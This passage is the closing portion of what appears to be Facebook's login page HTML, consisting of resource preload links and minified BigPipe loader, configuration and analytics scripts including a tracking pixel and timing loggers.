e)})});});
</script>

<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yU/l/0,cross/bhGfXdiV3qT.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />

<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yK/l/0,cross/Jb_Pu8uIID-.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />

<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yZ/l/0,cross/14eko7gk0Bn.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />

<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3icLj4/yu/l/en_GB/T0i-X06hfn6.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="P67Y8lVb" />

<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yK/r/9-YVmsuCk4h.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="P67Y8lVb" />

<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y7/l/0,cross/UkW0X_i76WG.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />

<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yz/l/0,cross/WKduNzP5aHu.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />

<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yk/l/0,cross/Fhk8Xusnfbz.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />

<script>now_inl=(function(){var p=window.performance;return p&&p.now&&p.timing&&p.timing.navigationStart?function(){return p.now()+p.timing.navigationStart}:function(){return new Date().getTime()};})();requireLazy(["BigPipe"],function(BigPipe){define("__bigPipe",[],window.bigPipe=new BigPipe({"forceFinish":true,"config":{"flush_pagelets_asap":true,"dispatch_pagelet_replayable_actions":false}}));});
</script>

<script nonce="P67Y8lVb">(function(){var n=now_inl();requireLazy(["__bigPipe"],function(bigPipe){bigPipe.beforePageletArrive("first_response",n);})})();
</script>

<script nonce="P67Y8lVb">requireLazy(["__bigPipe"],(function(bigPipe){bigPipe.onPageletArrive({displayResources:["6OhqI","jiDVi","bjH76","FR6N9","KO+fN","PQati","7f1P8","Q/kbd","P/mr5"],id:"first_response",phase:0,last_in_phase:true,tti_phase:0,all_phases:[63],hsrp:{hblp:{sr_revision:1002804734,consistency:{rev:1002804734}}},allResources:["6OhqI","jiDVi","LmicE","T0ebq","tnai5","zBR/X","0kAFS","Z+IXI","FR6N9","bjH76","owb84","8QsxI","OCF5K","5W2Iv","KO+fN","ZZIjT","SJElA","GtxZp","PQati","7f1P8","Q/kbd","P/mr5","fmNVq","51yTN","8jSBK"]});}));
</script>

<script>requireLazy(["__bigPipe"],function(bigPipe){bigPipe.setPageID("6882233133174423422-0")});CavalryLogger.setPageID("6882233133174423422-0");
</script>
<script nonce="P67Y8lVb">(function(){var n=now_inl();requireLazy(["__bigPipe"],function(bigPipe){bigPipe.beforePageletArrive("last_response",n);})})();
</script>

<script nonce="P67Y8lVb">requireLazy(["__bigPipe"],(function(bigPipe){bigPipe.onPageletArrive({displayResources:["FR6N9"],id:"last_response",phase:63,last_in_phase:true,the_end:true,jsmods:{define:[["TimeSliceInteractionSV",[],{on_demand_reference_counting:true,on_demand_profiling_counters:true,default_rate:1000,lite_default_rate:100,interaction_to_lite_coinflip:{ADS_INTERFACES_INTERACTION:0,ads_perf_scenario:0,ads_wait_time:0,Event:1},interaction_to_coinflip:{ADS_INTERFACES_INTERACTION:1,ads_perf_scenario:1,ads_wait_time:1,Event:100},enable_heartbeat:true,maxBlockMergeDuration:0,maxBlockMergeDistance:0,enable_banzai_stream:true,user_timing_coinflip:50,banzai_stream_coinflip:1,compression_enabled:true,ref_counting_fix:false,ref_counting_cont_fix:false,also_record_new_timeslice_format:false,force_async_request_tracing_on:false},2609],["cr:1458113",[],{__rc:[null,"Aa2Jy4xfjOOKj9BLWOhSk2WBpZZglHmIePuF4iGrGBNQUWp1yd-pfDzJlVdV15K5hpLBpoa-PPHoKITxBIfHriPH3nQ"]},-1],["cr:917439",["PageTransitionsBlue"],{__rc:["PageTransitionsBlue","Aa1RPzG8C6F3Cxjenv86ENaxSsoFb9jU27dSHNVX8ptihQwqTxzUFLNidwUZlNV3tpI06f3KBM7js37tXCCkUhM"]},-1],["cr:1108857",[],{__rc:[null,"Aa0jpE38e3UQAsHfqg7SREtT6cq3wZV5izzvcPjIG1oxsp_P0EjZAyv4ztjjlEq4MqmbqyVRUD5ewQ"]},-1],["cr:1269707",[],{__rc:[null,"Aa3SBzCrQ4yJPIL-i731kjwKhnMoZXQRGfIgsM2qcZNm_AeLVIPZ-N6xiASa2OCs672Zniy4I43acFp_Cj0"]},-1],["cr:1269708",[],{__rc:[null,"Aa3SBzCrQ4yJPIL-i731kjwKhnMoZXQRGfIgsM2qcZNm_AeLVIPZ-N6xiASa2OCs672Zniy4I43acFp_Cj0"]},-1],["cr:1269709",[],{__rc:[null,"Aa3SBzCrQ4yJPIL-i731kjwKhnMoZXQRGfIgsM2qcZNm_AeLVIPZ-N6xiASa2OCs672Zniy4I43acFp_Cj0"]},-1],["cr:1294158",["React.classic"],{__rc:["React.classic","Aa2PUvzcVFn8skDYxThplzsHocNsGY1EPfSDgtUy_tf2ytydNrTtIyx9OsPcHcm9hdSofjt8OZD8HDedyblBdWjo"]},-1],["cr:1294246",["ReactDOM.classic"],{__rc:["ReactDOM.classic","Aa2PUvzcVFn8skDYxThplzsHocNsGY1EPfSDgtUy_tf2ytydNrTtIyx9OsPcHcm9hdSofjt8OZD8HDedyblBdWjo"]},-1],["cr:1069930",[],{__rc:[null,"Aa1RPzG8C6F3Cxjenv86ENaxSsoFb9jU27dSHNVX8ptihQwqTxzUFLNidwUZlNV3tpI06f3KBM7js37tXCCkUhM"]},-1],["cr:1083116",["XAsyncRequest"],{__rc:["XAsyncRequest","Aa1RPzG8C6F3Cxjenv86ENaxSsoFb9jU27dSHNVX8ptihQwqTxzUFLNidwUZlNV3tpI06f3KBM7js37tXCCkUhM"]},-1],["cr:1083117",[],{__rc:[null,"Aa1RPzG8C6F3Cxjenv86ENaxSsoFb9jU27dSHNVX8ptihQwqTxzUFLNidwUZlNV3tpI06f3KBM7js37tXCCkUhM"]},-1],["cr:1697455",["CookieConsentActionHandler"],{__rc:["CookieConsentActionHandler","Aa1RPzG8C6F3Cxjenv86ENaxSsoFb9jU27dSHNVX8ptihQwqTxzUFLNidwUZlNV3tpI06f3KBM7js37tXCCkUhM"]},-1],["cr:888908",["warningBlue"],{__rc:["warningBlue","Aa1RPzG8C6F3Cxjenv86ENaxSsoFb9jU27dSHNVX8ptihQwqTxzUFLNidwUZlNV3tpI06f3KBM7js37tXCCkUhM"]},-1],["cr:971473",["LayerHideOnTransition"],{__rc:["LayerHideOnTransition","Aa1RPzG8C6F3Cxjenv86ENaxSsoFb9jU27dSHNVX8ptihQwqTxzUFLNidwUZlNV3tpI06f3KBM7js37tXCCkUhM"]},-1],["cr:1105154",[],{__rc:[null,"Aa0jpE38e3UQAsHfqg7SREtT6cq3wZV5izzvcPjIG1oxsp_P0EjZAyv4ztjjlEq4MqmbqyVRUD5ewQ"]},-1],["PageTransitionsConfig",[],{reloadOnBootloadError:true},1067],["CoreWarningGK",[],{forceWarning:false},725],["cr:1292365",["React-prod.classic"],{__rc:["React-prod.classic","Aa0jpE38e3UQAsHfqg7SREtT6cq3wZV5izzvcPjIG1oxsp_P0EjZAyv4ztjjlEq4MqmbqyVRUD5ewQ"]},-1],["cr:1344485",["ReactDOM.classic.prod-or-profiling"],{__rc:["ReactDOM.classic.prod-or-profiling","Aa0jpE38e3UQAsHfqg7SREtT6cq3wZV5izzvcPjIG1oxsp_P0EjZAyv4ztjjlEq4MqmbqyVRUD5ewQ"]},-1],["cr:983844",[],{__rc:[null,"Aa0jpE38e3UQAsHfqg7SREtT6cq3wZV5izzvcPjIG1oxsp_P0EjZAyv4ztjjlEq4MqmbqyVRUD5ewQ"]},-1],["cr:1344486",["ReactDOM.classic.prod"],{__rc:["ReactDOM.classic.prod","Aa2jtdDGlffYfYLyTahWes5jwTmrAliaQn05yfJMj4jSvgKvxFGUAHv-97ToIFeeCsxBFnWqp3pywSMee_5cjbCbVipjiA"]},-1],["cr:1344487",["ReactDOM-prod.classic"],{__rc:["ReactDOM-prod.classic","Aa1YfQmPHg_PEgbr5yf-tcbkxH_jcL1mpmR2SsIl-qPHqdc9EB3SwrGgjt7XPfw3nMUA6FnZcD-RyI5cpG2CNF3WatXjdvqlzNTL"]},-1],["cr:1292369",["SchedulerTracing-prod.classic"],{__rc:["SchedulerTracing-prod.classic","Aa2jtdDGlffYfYLyTahWes5jwTmrAliaQn05yfJMj4jSvgKvxFGUAHv-97ToIFeeCsxBFnWqp3pywSMee_5cjbCbVipjiA"]},-1],["cr:1353359",["EventListenerImplForBlue"],{__rc:["EventListenerImplForBlue","Aa2BVUz0cQx4Xye3shTbs4AeLYSOEW8jVN2U7uHdSTVRnQW6ZEhMYEbKP6For8Hf_cnplzGsrn7G4yRWK3gvHuBqr7_Zvg"]},-1],["KillabyteProfilerConfig",[],{htmlProfilerModule:null,profilerModule:null,depTypes:{BL:"bl",NON_BL:"non-bl"}},1145],["QuicklingConfig",[],{version:"1002804741;0;",sessionLength:30,inactivePageRegex:"^/(fr/u\\.php|ads/|advertising|ac\\.php|ae\\.php|a\\.php|ajax/emu/(end|f|h)\\.php|badges/|comments\\.php|connect/uiserver\\.php|editalbum\\.php.+add=1|ext/|feeds/|help([/?]|$)|identity_switch\\.php|isconnectivityahumanright/|intern/|login\\.php|logout\\.php|sitetour/homepage_tour\\.php|sorry\\.php|syndication\\.php|webmessenger|/plugins/subscribe|lookback|brandpermissions|gameday|pxlcld|comet|worldcup/map|livemap|work/reseller|([^/]+/)?dialog|legal|.+\\.pdf$|.+/settings/)",badRequestKeys:["nonce","access_token","oauth_token","xs","checkpoint_data","code"],logRefreshOverhead:false},60],["TrackingConfig",[],{domain:"https://pixel.facebook.com"},325],["WebStorageMonsterLoggingURI",[],{uri:"/ajax/webstorage/process_keys/?state=1"},3032],["WebDevicePerfInfoData",[],{needsFullUpdate:true,needsPartialUpdate:false,shouldLogResourcePerf:false},3977],["BrowserPaymentHandlerConfig",[],{enabled:false},3904],["TimeSpentConfig",[],{"0_delay":0,"0_timeout":8,delay:1000,timeout:64},142],["cr:1351741",["CometEventListener"],{__rc:["CometEventListener","Aa3WXKcO7g2ApmSVTjAqCm9unCjpW0L5BS4vseKfiawvE4aglgC5EdGp7NTUdCzWuTQaPU4NKzPi8pmZ8mK15O7Aj0MtEQPgkuLhwKMUw9S46IaX"]},-1],["cr:1634616",["UserActivityBlue"],{__rc:["UserActivityBlue","Aa1RPzG8C6F3Cxjenv86ENaxSsoFb9jU27dSHNVX8ptihQwqTxzUFLNidwUZlNV3tpI06f3KBM7js37tXCCkUhM"]},-1],["cr:844180",["TimeSpentImmediateActiveSecondsLoggerBlue"],{__rc:["TimeSpentImmediateActiveSecondsLoggerBlue","Aa1RPzG8C6F3Cxjenv86ENaxSsoFb9jU27dSHNVX8ptihQwqTxzUFLNidwUZlNV3tpI06f3KBM7js37tXCCkUhM"]},-1],["cr:1187159",["BlueCompatBroker"],{__rc:["BlueCompatBroker","Aa1RPzG8C6F3Cxjenv86ENaxSsoFb9jU27dSHNVX8ptihQwqTxzUFLNidwUZlNV3tpI06f3KBM7js37tXCCkUhM"]},-1],["ImmediateActiveSecondsConfig",[],{sampling_rate:0},423]],require:[["TrackingPixel","loadWithNoReferrer",[],["https://cx.atdmt.com/?f=AYw7fM-3krnpJ6KIKTZij46vgqs1mLRPDXNx-QBEqpI3ed_osnWEv5n5ZJh34bYMLH-eunxEyYeDw-0W-RncQfIZ&c=763625240&v=1&l=2"]],["CavalryLoggerImpl","startInstrumentation",[],[]],["NavigationMetrics","setPage",[],[{page:"WebLoginPageController",page_type:"normal",page_uri:"https://www.facebook.com/login/",serverLID:"6882233133174423422-0"}]],["Chromedome","start",[],[[]]],["DimensionTracking"],["HighContrastMode","init",[],[{isHCM:false,spacerImage:"https://static.xx.fbcdn.net/rsrc.php/v3/y4/r/-PAXP-deijE.gif"}]],["NavigationClickPointHandler"],["WebStorageMonster","schedule",[],[true]],["ClickRefLogger"],["DetectBrokenProxyCache","run",[],[0,"c_user"]],["WebDevicePerfInfoLogging","doLog",[],[]],["Artillery","disable",[],[]],["ScriptPathLogger","startLogging",[],[]],["TimeSpentBitArrayLogger","init",[],[]],["Bootloader","markComponentsAsImmediate",[],[["VisualCompletionGating"]]]]},hsrp:{hsdp:{clpData:{"1743690":{r:1}},gkxData:{"1427308":{result:false,hash:"AT7yLeswTif3jcLm"}}},hblp:{sr_revision:1002804734,consistency:{rev:1002804734},rsrcMap:{FEt5G:{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3/yH/r/7oVtGLsr9D2.js?_nc_x=Ij3Wp8lg5Kz"},"st+LH":{type:"js",src:"https://static.xx.fbcdn.net/rsrc.php/v3iX3c4/y2/l/en_GB/sdSBZ1HKkNc.js?_nc_x=Ij3Wp8lg5Kz"}}}},allResources:["LmicE","FEt5G","st+LH","FR6N9","zBR/X","MoAVN","T0ebq","tnai5"],onload:["CavalryLogger.getInstance(\"6882233133174423422-0\").setTTIEvent(\"t_domcontent\");"],onafterload:["CavalryLogger.getInstance(\"6882233133174423422-0\").collectBrowserTiming(window)","window.CavalryLogger&&CavalryLogger.getInstance().setTimeStamp(\"t_paint\");","if (window.ExitTime){CavalryLogger.getInstance(\"6882233133174423422-0\").setValue(\"t_exit\", window.ExitTime);};"]});}));
</script>
</body>
</html>